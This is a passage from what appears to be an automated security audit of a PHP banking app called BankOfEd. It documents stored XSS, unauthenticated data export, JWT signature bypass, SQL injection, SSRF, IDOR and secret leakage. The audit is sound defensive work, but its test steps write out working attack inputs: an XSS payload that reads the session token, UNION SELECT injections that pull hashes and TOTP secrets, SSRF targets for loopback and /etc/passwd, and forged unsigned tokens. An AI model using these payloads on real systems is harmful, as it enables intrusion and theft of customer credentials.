  "severity_reasoning": "The dashboard listing is outgoing-only, so a normal credit to the victim does not hit this sink; the working cross-user plant is transferExternal IDOR. Still a real stored XSS with no CSP. Medium because it depends on the sibling IDOR (or self-XSS / payment API) rather than a simple incoming transfer.",
  "dynamic_test": "As attacker, POST /api/transfers/external with the victim's from_account_id, any destination, and description `<img src=x onerror=\\\"alert(localStorage.bankofed_token)\\\">` (omit totp_code). As victim, load the banking dashboard and confirm the recent-transactions renderer executes the payload."
}
```

#### Validator reasoning

Confirmed stored XSS at the cited dashboard sink. `renderTransactions` concatenates `tx.description` (fallback `tx.type`) into an HTML string and assigns it to `container.innerHTML` with no `U.escapeHtml` call, unlike `account_name`/`bsb`/`account_number` on the same page. Description is attacker-controlled: `POST /api/transfers/own` and `POST /api/transfers/external` accept `description` as `string|max:255` with no HTML sanitization (`Validator` only type/length-checks; `TransferService` persists `$description` unchanged via `Transaction::create`; `Transaction::format` returns it as-is). PHP `json_encode` does not hex-escape `<`/`>`. The banking SPA has no Content-Security-Policy (deploy.sh only sets nosniff/frame-options/legacy X-XSS-Protection, none of which block innerHTML XSS). Session token lives in `localStorage.bankofed_token`, so a payload such as `<img src=x onerror="…localStorage.bankofed_token">` (well under 255 chars) executes in the banking origin.

Dashboard `GET /api/transactions` (no `account_id`) joins only `from_account_id`, so incoming transfers do not appear there. Cross-user impact on this specific sink is via `TransferService::transferExternal`, which loads the source with `Account::findById` (no ownership check). An authenticated attacker can create an outgoing transaction on a victim account with a malicious description; the victim’s dashboard then renders it. TOTP is not a blocking control (proceeds if TOTP is unset or the code is omitted). `script` tags would not run via innerHTML, but event-handler / `<img onerror>` payloads do. Path (1) in the writeup (incoming transfer showing on the dashboard) is incorrect for this sink, but path (2) plus the unescaped account-detail renderer (`accounts.js:164`, which does include `to_account_id`) establish a concrete exploitable stored-XSS path.

#### Code evidence

````
dashboard.js renderTransactions:
```
html +=
  '<div class="tx-row flex items-center gap-4 px-6 py-4">' +
    icon +
    '<div class="flex-1 min-w-0">' +
      '<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>' +
      ...
container.innerHTML = html;
```
Contrast with nearby account cards, which correctly call `U.escapeHtml(acc.account_name)`.

TransferService persists `$description` unchanged. TransactionController validates it only as `string|max:255`. PaymentController::transfer builds `description` from unsanitized `payee_name`/`reference`.
````

## 31. Unauthenticated admin export dumps all users, hashes, and transactions

- Lead reference: ENCX-031
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:48
- Fingerprint: ede85bc0b417c52f36e626065a089abc1077853035b72387aaa84a1e080cfb31

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "addRoute",
  "input": "unauthenticated GET /api/admin/export/users"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 173,
  "symbol": "exportAll",
  "operation": "SELECT * FROM users/accounts/transactions"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/admin/export/users",
    "public/index.php -> AdminRouter::dispatch; route auth => false skips AdminAuthMiddleware",
    "AdminUserController::exportAll SELECT * FROM users, accounts, transactions",
    "Response::success returns password hashes, TOTP secrets, account numbers, balances, and the full ledger"
  ],
  "impact": "Anyone who can reach the API obtains the entire banking dataset: MD5/bcrypt hashes, TOTP secrets, PANs/CVVs, balances, and all transactions.",
  "severity_reasoning": "Live public admin route with an explicit auth opt-out and unbounded SELECT *. Sibling customer/account/system admin routes require JWTs, so this is not a global public-admin design. High-impact unauthenticated dump.",
  "dynamic_test": "Unauthenticated GET /api/admin/export/users. Assert 200 and presence of users.password_hash, users.totp_secret, accounts.card_cvv, accounts.balance, and a non-empty transactions array."
}
```

#### Validator reasoning

GET /api/admin/export/users is a live, publicly reachable admin route that dumps the entire customer, account, and transaction tables with no authentication.

Source-to-sink path:
1. public/index.php routes any /api/admin/* URI to AdminRouter::dispatch() after only CorsMiddleware (no auth).
2. AdminRouter.php:48 registers GET /api/admin/export/users with auth => false. The dispatcher (lines 70-75) calls AdminAuthMiddleware::handle() only when $route['auth'] is true, so this handler is invoked with no token check.
3. AdminUserController::exportAll() (line 171) takes no $auth argument, runs SELECT * FROM users, SELECT * FROM accounts, and SELECT * FROM transactions, then Response::success() JSON-encodes the full result sets and exits.

Schema impact: users includes password_hash and totp_secret; accounts includes bsb, account_number, balance, card_number, card_expiry, card_cvv; transactions is the full ledger. AuthService::hashPassword() uses md5() for new registrations, so leaked hashes are often immediately crackable; seed users use bcrypt. Sibling admin routes all set auth => true, confirming this opt-out is accidental rather than a global public-admin design. CORS reflects Origin with credentials, so a browser on another origin can also fetch the dump. No IP allowlist, API key, or in-handler authorization exists. The route is not dead code: FastRoute matches it and call_user_func_array invokes the handler.

#### Code evidence

```
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();

    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();

    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();

    Response::success([
        'users'        => $users,
        'accounts'     => $accounts,
        'transactions' => $transactions,
    ]);
}
```

## 32. JWT decoder ignores signatures, allowing authentication bypass

- Lead reference: ENCX-032
- Category: A07
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:54
- Fingerprint: 9721db7e5b0f359a13a1dd704a33a319e52bf156edeb4771961b47cb8ab94253

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 22,
  "symbol": "handle",
  "input": "HTTP Authorization Bearer token"
}
```

#### Controls encountered

```
[
  "AuthMiddleware expiry check (attacker-controlled exp)",
  "isTokenRevoked lookup (attacker-controlled jti; unused jti is not revoked)",
  "User::findById existence check (sequential integer IDs)",
  "totpVerify/totpDisable require a TOTP code, but GET /api/profile leaks totp_secret so this is not an effective control"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "decodeToken",
  "operation": "base64 JSON decode without signature verify"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker forges header.payload.sig with victim sub, unused jti, future exp",
    "Authorization: Bearer on POST /api/profile/totp/verify or any other auth => true customer route",
    "AuthMiddleware::handle -> AuthService::decodeToken (base64 payload + exp only; no HMAC)",
    "Revocation miss on fresh jti; User::findById(sub) loads victim",
    "Handler executes as the victim (TOTP setup/verify/disable, transfers, profile)"
  ],
  "impact": "Authentication bypass: attacker impersonates any customer, including TOTP and money-moving endpoints, without knowing jwt_secret or the password.",
  "severity_reasoning": "Firebase JWT is used to create tokens but never to verify them on the customer path. User IDs are enumerable. GET /api/profile then leaks totp_secret so even TOTP-gated follow-ons are reachable. High, complete unauthenticated takeover.",
  "dynamic_test": "Forge a three-part JWT for sub of a seeded user. Call POST /api/profile/totp/verify and GET /api/profile with that Bearer token. Confirm 200 as that user without a valid signature. Also call a transfer endpoint to show fund-moving reach."
}
```

#### Validator reasoning

AuthService::decodeToken is the only JWT decoder used by customer AuthMiddleware. It splits the token, base64-decodes the middle segment, and rejects only malformed or expired payloads. The imported Firebase JWT library is used to *create* tokens (HS256) but is never used to verify them. Router.php invokes AuthMiddleware::handle() for every `'auth' => true` route, including GET/PUT /api/profile, TOTP endpoints, accounts, and transfers. After decode, isTokenRevoked() looks up the attacker-chosen jti (a fresh value is not revoked), then User::findById($payload->sub) loads the victim. User IDs are sequential integers (seeded 1–10), so sub is enumerable. A three-part forged token with a future exp, existing sub, and unused jti authenticates as that user with no secret. GET /api/profile then returns the victim’s profile (including password_hash and totp_secret via User::toPublic), so TOTP-gated follow-on actions are also reachable. AdminAuthMiddleware correctly calls JWT::decode, confirming this is a customer-auth defect rather than a framework guarantee.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}

$r->addRoute('POST', '/api/profile/totp/verify', ['handler' => [ProfileController::class, 'totpVerify'], 'auth' => true]);
```

## 33. SQL injection in admin customer search

- Lead reference: ENCX-033
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:28
- Fingerprint: 84efcbf2e8b26c384c44d775a94c65c391dfc0938480b1d430c32db545743880

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 16,
  "symbol": "$_GET['search']",
  "input": "query parameter search"
}
```

#### Controls encountered

```
[
  "AdminAuthMiddleware JWT required (route auth => true) — does not sanitize or parameterize search",
  "page/per_page/offset are integer-cast before LIMIT/OFFSET interpolation — does not constrain $search",
  "PDO ATTR_EMULATE_PREPARES false — may block stacked queries, not UNION/error-based SQLi",
  "Unused $params = [] never bound; $db->query() used instead of prepare()"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 28,
  "symbol": "$db->query",
  "operation": "PDO::query"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Stacked-query writes (e.g. DROP) may fail under native MySQL PDO single-statement query(); UNION and error-based extraction do not depend on that."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker presents a valid admin JWT (AdminAuthMiddleware on GET /api/admin/customers)",
    "Query parameter search is copied from $_GET with no escaping",
    "AdminUserController::index interpolates $search into LIKE '%{$search}%' on first_name/last_name/email",
    "PDO::query executes the concatenated COUNT SQL (unused $params never bound)",
    "UNION or error-based payloads (public/index.php reflects $e->getMessage()) extract other tables",
    "Injected SQL runs as AdminDatabase credentials (Docker ADMIN_DB_USER=root; same user can DROP DATABASE)"
  ],
  "impact": "Authenticated SQL injection on admin customer search: in-band/error-based extraction of password hashes, TOTP secrets, card data, and other tables, running as a highly privileged MySQL account.",
  "severity_reasoning": "Classic concatenation into PDO::query with a seven-column listing sibling for UNION. Admin JWT is an access gate, not a query control. Native prepares may block stacked writes, but UNION/error-based reads succeed. High.",
  "dynamic_test": "As admin, GET /api/admin/customers?search=x%' UNION SELECT id,password_hash,totp_secret,email,phone,1,created_at FROM users-- . Confirm hashes appear in the JSON customers array. Also try EXTRACTVALUE error-based payloads and observe INTERNAL_ERROR message leakage."
}
```

#### Validator reasoning

Confirmed source-to-sink SQL injection on GET /api/admin/customers. AdminUserController::index copies $_GET['search'] into $search with no validation or escaping, interpolates it three times into a LIKE WHERE clause via "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'", then executes that string with PDO::query() for both the COUNT query (line 28) and the seven-column SELECT (line 33). An unused $params = [] array shows parameterization was started and abandoned. Breaking out of the LIKE quotes (e.g. x%' UNION SELECT ... --) is unconstrained; the data query returns id, email, first_name, last_name, phone, totp_enabled, created_at as JSON, so UNION can exfiltrate password_hash, totp_secret, card_cvv and other tables in-band. PDO::ERRMODE_EXCEPTION plus public/index.php reflecting $e->getMessage() also enables error-based extraction. AdminAuthMiddleware JWT is required, but it is only endpoint auth, not a query-construction control: the attacker uses the intended search parameter. Integer-casting of page/per_page/offset does not constrain $search. The same AdminDatabase credentials used here are used for DROP DATABASE in resetDatabase, and the Docker image sets ADMIN_DB_USER=root, so injected SQL runs as a highly privileged MySQL account. No addslashes, quote, or prepare/bind is applied to $search on this path.

#### Code evidence

```
$search = $_GET['search'] ?? '';
...
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 34. Unauthenticated admin export dumps all users, accounts, and transactions

- Lead reference: ENCX-034
- Category: A01
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:174
- Fingerprint: d95128a5b7bafecc32b18b5a468225f6c7aa48ca8a0abfd236be6a1a63d57465

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "exportAll",
  "input": "unauthenticated GET request"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 174,
  "symbol": "$db->query",
  "operation": "PDO::query"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated HTTP GET /api/admin/export/users",
    "AdminRouter auth => false skips AdminAuthMiddleware",
    "AdminUserController::exportAll SELECT * FROM users, accounts, transactions on the shared bankofed DB",
    "Response::success JSON-encodes raw rows including password_hash, totp_secret, card_cvv, balances, ledger"
  ],
  "impact": "Unauthenticated exfiltration of the entire customer, account, and transaction dataset including credentials and card SAD.",
  "severity_reasoning": "Handler takes no $auth argument and uses SELECT *. CORS reflects Origin with credentials. High-impact, no compensating control on the path.",
  "dynamic_test": "GET /api/admin/export/users without a token. Verify JSON users/accounts/transactions arrays include secrets and SAD columns. Confirm the same request still succeeds when an invalid Authorization header is sent."
}
```

#### Validator reasoning

Confirmed unauthenticated mass data export. public/index.php sends every /api/admin/* request to AdminRouter::dispatch() with no outer auth. AdminRouter registers GET /api/admin/export/users with auth => false (the only admin data route besides login that does so). Dispatch then skips AdminAuthMiddleware::handle() whenever $route['auth'] is false, so exportAll() is invoked with no credentials. The handler runs unparameterized SELECT * against users, accounts, and transactions on the shared bankofed database and JSON-encodes the full result via Response::success(). Schema.sql shows those tables contain password_hash, totp_secret, full PII, card_number/card_expiry/card_cvv, balances, and the complete ledger. No IP allowlist, token check, field projection, or other control sits on this path. CORS even reflects arbitrary Origin with credentials, so a browser from any site can also pull the dump. The comment "for internal tooling" is not enforced.

#### Code evidence

```
// src/AdminRouter.php
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

// src/Controllers/AdminUserController.php
public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 35. SQL injection in admin customer listing fetch query

- Lead reference: ENCX-035
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:33
- Fingerprint: c15ab7b3a658e377dfb0db918929b459fdfa2c6c24d91b8b54ab6c982e56efb5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 16,
  "symbol": "$_GET['search']",
  "input": "query parameter search"
}
```

#### Controls encountered

```
[
  "AdminAuthMiddleware requires a valid admin JWT (authorizes the caller; does not sanitize or bind search)",
  "page and per_page/LIMIT/OFFSET are integer-cast (does not apply to search)",
  "PDO ATTR_EMULATE_PREPARES=false is irrelevant because the sink uses PDO::query with concatenated SQL, not bound parameters"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 33,
  "symbol": "$db->query",
  "operation": "PDO::query"
}
```

#### Counterevidence

```
[
  "PDO MySQL/MariaDB typically does not enable MYSQL_ATTR_MULTI_STATEMENTS, so stacked statements (e.g. trailing INSERT/DROP) are likely blocked; UNION/boolean/error-based injection in the single SELECT still succeed.",
  "Caller must already hold an admin JWT; this does not prevent extraction of secrets the listing is designed not to return."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated admin GET /api/admin/customers?search=<UNION payload>",
    "$_GET['search'] interpolated into the seven-column SELECT ... FROM users {$where} ... LIMIT/OFFSET",
    "PDO::query (not prepare) executes attacker SQL; fetchAll results are returned as API JSON",
    "UNION SELECT of matching arity dumps password_hash, totp_secret, admin credentials, card_cvv"
  ],
  "impact": "In-band SQL injection on the customer listing query: extracted secrets appear directly in the JSON response.",
  "severity_reasoning": "This is the data-returning sink of the same unsanitized search parameter. Seven projected columns make UNION extraction straightforward. Admin JWT authorizes the caller but does not bind or sanitize search. High.",
  "dynamic_test": "GET /api/admin/customers?search=%' UNION SELECT 1,password_hash,totp_secret,'x','y',0,'2020-01-01' FROM users LIMIT 1-- with an admin JWT. Confirm the listing JSON contains another user's hash/secret in the projected columns."
}
```

#### Validator reasoning

Concrete authenticated source-to-sink SQLi on GET /api/admin/customers. AdminRouter maps the route to AdminUserController::index after AdminAuthMiddleware JWT. $_GET['search'] is assigned with no validation, quoting, or allowlist, then interpolated into a LIKE clause and into a 7-column SELECT that is executed with PDO::query() (not prepare/execute). The unused $params = [] array shows incomplete parameterization. fetchAll() results are returned in the API JSON, so UNION SELECT of matching arity is in-band and can exfiltrate columns the listing intentionally omits (users.password_hash, users.totp_secret, admin_users credentials, card_cvv, machine_tokens). page/per_page are integer-cast and do not touch search. JWT is an access gate, not an injection control. Global exception handling in public/index.php also returns PDO error messages, enabling error-based extraction if UNION is malformed. No effective blocking control on this path.

#### Code evidence

```
$search = $_GET['search'] ?? '';
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 36. Unauthenticated export dumps all users, accounts, cards, and transactions

- Lead reference: ENCX-036
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:174
- Fingerprint: 8b214223afc4234aa55bf1457f4d8924953806d2b7ad55ad4336ced94708aab0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "addRoute",
  "input": "unauthenticated GET /api/admin/export/users"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 174,
  "symbol": "$db->query",
  "operation": "SELECT * FROM users/accounts/transactions returned to client"
}
```

#### Counterevidence

```
[
  "Route comment labels the endpoint as internal tooling, but nothing in the router, middleware, web server, or Docker image restricts callers."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated GET /api/admin/export/users → AdminRouter registers auth => false so AdminAuthMiddleware is skipped",
    "AdminUserController::exportAll runs SELECT * FROM users, SELECT * FROM accounts, SELECT * FROM transactions",
    "Raw rows are passed to Response::success — users include password_hash and totp_secret; accounts include card_number, card_expiry, card_cvv"
  ],
  "impact": "Unauthenticated bulk exfiltration of every customer credential, 2FA seed, full PAN/CVV, balances, and transaction history.",
  "severity_reasoning": "High: complete break of access control on the bank’s most sensitive tables, including PCI card data, with zero authentication.",
  "dynamic_test": "GET /api/admin/export/users without a token. Assert JSON data.users contains password_hash/totp_secret, data.accounts contains card_number/card_expiry/card_cvv when those columns are populated, and data.transactions is a full dump. Record response size as evidence of bulk export."
}
```

#### Validator reasoning

GET /api/admin/export/users is explicitly registered with auth => false. AdminRouter only invokes AdminAuthMiddleware when that flag is true, so the request never requires a JWT. public/index.php routes all /api/admin/* traffic into AdminRouter after only CORS handling; .htaccess, Docker, and Apache config add no IP allowlist, basic auth, or other gate. The handler AdminUserController::exportAll() takes no auth argument, runs SELECT * on users, accounts, and transactions, and returns the FETCH_ASSOC rows via Response::success as JSON. Schema columns therefore leak password_hash, totp_secret, PII, full card_number/card_expiry/card_cvv, balances, and all transaction history to any unauthenticated caller. The comment “for internal tooling” is not enforced by any control.

#### Code evidence

```
AdminRouter.php: $r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

AdminUserController::exportAll():
$stmt = $db->query('SELECT * FROM users');
$stmt = $db->query('SELECT * FROM accounts');
$stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
```

## 37. SSRF: avatar proxy fetches attacker-controlled URL and returns the body

- Lead reference: ENCX-037
- Category: A10
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:79
- Fingerprint: 5244199555e152820a7697d531f47633070d2660aee112a7e7348f245d2565f0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 65,
  "symbol": "$data['url']",
  "input": "JSON body url"
}
```

#### Controls encountered

```
[
  "AuthMiddleware customer JWT on POST /api/profile/avatar — bypassed via public POST /api/auth/register",
  "empty($data['url']) presence check only — no scheme/host/IP validation",
  "5s HTTP timeout — does not prevent successful fetches",
  "FETCH_FAILED on false return — does not block successful SSRF"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 79,
  "symbol": "file_get_contents",
  "operation": "server-side fetch of attacker URL"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "allow_url_fopen / wrapper availability inferred from stock php:8.2-apache defaults and the absence of any php.ini/open_basedir/disable_functions override in the repo; not runtime-verified",
  "Cloud-metadata reachability depends on deployment environment"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker authenticates as any customer (real token or unsigned JWT) → POST /api/profile/avatar (auth => true)",
    "ProfileController::avatarProxy reads JSON url with no scheme/host/private-network allowlist",
    "file_get_contents($data['url']) is invoked with HTTP follow_location enabled (also accepts file:// and php:// wrappers)",
    "Fetched bytes are base64-encoded and returned as avatar_data; the URL is persisted as avatar_url on the caller's profile"
  ],
  "impact": "SSRF data oracle: read internal HTTP (GET /api/health JWT secret, GET /api/admin/export/users dump), cloud metadata, or local files, then receive the body in the JSON response.",
  "severity_reasoning": "High: authenticated SSRF with response-body reflection and open redirects. Combined with unsigned JWTs this is reachable without a password; chaining to /api/admin/export/users or /api/health yields full DB/secret theft even if those ports were not directly exposed.",
  "dynamic_test": "POST /api/profile/avatar as any customer with {\\\"url\\\":\\\"http://127.0.0.1/api/health\\\"} and confirm avatar_data base64-decodes to the health JSON including jwt_secret. Repeat with http://127.0.0.1/api/admin/export/users and, if the PHP wrappers are enabled, file:///etc/passwd. follow_location should also chase an external redirect to an internal host."
}
```

#### Validator reasoning

POST /api/profile/avatar is a live FastRoute handler (`Router.php:51`) that requires only a customer JWT. Registration (`POST /api/auth/register`) is public and immediately issues that JWT, so any attacker can reach the handler.

`ProfileController::avatarProxy` JSON-decodes `php://input` and, after an `empty($data['url'])` check only, passes `$data['url']` straight into `file_get_contents()` with an HTTP stream context that sets `follow_location => true` and a 5s timeout. There is no scheme allowlist, host allowlist, private-IP/metadata block, `FILTER_VALIDATE_URL`, content-type/size gate, or wrapper restriction. The fetched bytes are `base64_encode`d and returned as `avatar_data` in the JSON response, so the SSRF is fully out-of-band readable.

The Docker image is stock `php:8.2-apache` with no `php.ini` override, `allow_url_fopen=Off`, `open_basedir`, or `disable_functions`. Default PHP wrappers therefore remain available: `http(s)://` (including loopback and link-local), `file://`, and `php://filter`. Same-container impact is concrete: `GET /api/health` (`auth => false`) returns `jwt_secret` and DB credentials, and `GET /api/admin/export/users` (`auth => false`) dumps all users, accounts, and transactions. AuthMiddleware is not an effective blocking control for this class of bug.

#### Code evidence

```
public static function avatarProxy(array $auth): void {
    $data = json_decode(file_get_contents('php://input'), true) ?? [];
    // no URL validation
    $context = stream_context_create([
        'http' => ['timeout' => 5, 'follow_location' => true],
    ]);
    $content = @file_get_contents($data['url'], false, $context);
    User::update((int)$auth['user']['id'], ['avatar_url' => $data['url']]);
    $encoded = base64_encode($content);
    Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", 'source_url' => $data['url']]);
}
```

## 38. IDOR: profile update accepts arbitrary user_id

- Lead reference: ENCX-038
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:54
- Fingerprint: 63f2f567de28d000f191314762282afb75213963bf3849ed1f723b8d307e9c63

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 54,
  "symbol": "$data['user_id']",
  "input": "JSON body user_id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware requires a Bearer token and loads some user (authentication, not object-level authorization)",
  "Field allowlist in ProfileController and User::update restricts writable columns, not the target row",
  "Email uniqueness check compares against the authenticated user's email, not the target user",
  "users.email UNIQUE constraint only blocks colliding with an already-registered address"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 57,
  "symbol": "User::update",
  "operation": "UPDATE users SET ... WHERE id = attacker-chosen id"
}
```

#### Counterevidence

```
[
  "Password, totp_secret, and totp_enabled are not writable through this allowlist, so the endpoint alone does not reset another user's password",
  "Assigning an already-registered email fails on the UNIQUE constraint (PDO ERRMODE_EXCEPTION)"
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Any customer JWT (including unsigned forged token) → PUT /api/profile",
    "ProfileController::update prefers JSON user_id over the authenticated session id with no ownership or role check",
    "User::update($targetUserId, $updateData) writes attacker-controlled email/name/phone/address for the victim",
    "Response returns toPublic of the victim (including password_hash/totp_secret)"
  ],
  "impact": "Account takeover primitive: change another customer's login email and deface their profile. Unsigned JWTs mean no password is required.",
  "severity_reasoning": "High: IDOR on identity attributes used for login. Distinct from the toPublic leak — this is the unauthorized write of user_id.",
  "dynamic_test": "PUT /api/profile as user 1 with {\\\"user_id\\\":3,\\\"email\\\":\\\"taken@example.com\\\",\\\"first_name\\\":\\\"Hacked\\\"}. GET /api/profile as user 3 (forged sub=3) and confirm the email/name changed. Attempt login with Zoe Williams' original email and expect USER_NOT_FOUND / failure."
}
```

#### Validator reasoning

PUT /api/profile is wired with auth=true (Router.php) and ProfileController::update reads the JSON body, then sets `$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id']` with no comparison to `$auth['user']['id']` and no role/admin check. The only object-level comment is “Allow specifying which profile to update.” Allowed columns (first_name, last_name, email, phone, address_*) are passed to User::update($targetUserId, $updateData), which issues `UPDATE users SET ... WHERE id = ?`. AuthMiddleware only proves a Bearer token maps to some user; the field allowlist limits columns, not the target row. Email uniqueness is checked against the authenticated user’s current email, not the victim’s, so an attacker can assign any unused address to another customer (schema UNIQUE only blocks already-used emails). Concrete exploit: authenticate as any customer, PUT /api/profile with `{"user_id": <victim>, "email": "attacker-controlled@example.com", "first_name": "x"}`. That defaces/locks the victim’s login identifier. Password is not in the allowlist, so this is not a one-shot password takeover, but unauthorized modification of another customer’s PII and email is a live IDOR. Unsigned JWT verification in AuthService::decodeToken compounds reach (forged sub) but is not required for the IDOR itself.

#### Code evidence

```
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];
if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}
$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');
```

## 39. Profile and auth responses leak password_hash and totp_secret

- Lead reference: ENCX-039
- Category: A02
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/User.php:82
- Fingerprint: a6270de7a482183fabeb72c70e01ccea74ba1534a8d8f772f12757d884e85361

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 13,
  "symbol": "User::toPublic",
  "input": "authenticated user record"
}
```

#### Controls encountered

```
[
  "AuthMiddleware on GET/PUT /api/profile (authenticates caller; does not redact password_hash or totp_secret)",
  "totp_secret is NULL until 2FA setup (password_hash still always returned)",
  "Dedicated totpSetup response already exposes the secret once during enrollment (does not justify returning it on every profile/auth response)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Helpers/Response.php",
  "line": 10,
  "symbol": "json_encode",
  "operation": "JSON response including password_hash and totp_secret"
}
```

#### Counterevidence

```
[
  "totpVerify/totpDisable do not call User::toPublic(); the candidate slightly overstated 'totp flows that reload the user' as additional sinks"
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated GET /api/profile, POST /api/auth/login, POST /api/auth/register, or totp/profile flows that reload the user",
    "Each handler returns User::toPublic($user)",
    "toPublic copies password_hash and totp_secret into the client JSON (A02 sensitive-data exposure sink)",
    "Browser/localStorage, proxy logs, XSS, or the profile-update IDOR then hold the MD5/bcrypt hash and live TOTP seed"
  ],
